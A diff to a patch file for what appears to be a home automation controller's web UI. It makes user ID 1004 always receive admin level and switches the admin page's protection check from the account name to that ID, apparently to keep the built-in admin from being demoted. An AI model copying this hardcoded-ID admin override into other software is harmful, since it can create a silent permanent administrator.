@@ -1,6 +1,19 @@
 --- a/www/rega/esp/system.fn
 +++ b/www/rega/esp/system.fn
-@@ -1182,7 +1182,7 @@
+@@ -1137,7 +1137,11 @@
+   user.UserFirstName(system.GetVar("firstName"));
+   user.UserLastName(system.GetVar("lastName"));
+   user.UserEasyLinkMode(system.GetVar("bEasy"));
+-  user.UserLevel(system.GetVar("level"));
++  if (user.ID() == 1004) {
++    user.UserLevel(iulAdmin);
++  } else {
++    user.UserLevel(system.GetVar("level"));
++  }
+   user.UserPhoneNumber(system.GetVar("phone"));
+   user.UserMailAddress(system.GetVar("mail"));
+   boolean bLogin = false;
+@@ -1182,7 +1186,7 @@
      oUser = dom.GetObject( system.GetVar("userid") );
      if( oUser )
      {
@@ -11,16 +24,19 @@
          if( oFavorites )
 --- a/www/rega/pages/msg/userAccountConfigAdmin.htm
 +++ b/www/rega/pages/msg/userAccountConfigAdmin.htm
-@@ -25,7 +25,7 @@
-       if(userToTest.Name() == "Admin") 
+@@ -22,10 +22,9 @@
+       {
+         sDeviceDisabled = "";
+       }
+-      if(userToTest.Name() == "Admin") 
++      if(userToTest.ID() == 1004)
        {
          sDisabled = "disabled";
 -        sSuperAdminDisabled = "disabled";
-+        !sSuperAdminDisabled = "disabled";
          sDeviceDisabled = "disabled";
        }
      }
-@@ -34,6 +34,7 @@
+@@ -34,6 +33,7 @@
  </div>
  
  <div class="CLASS00700">
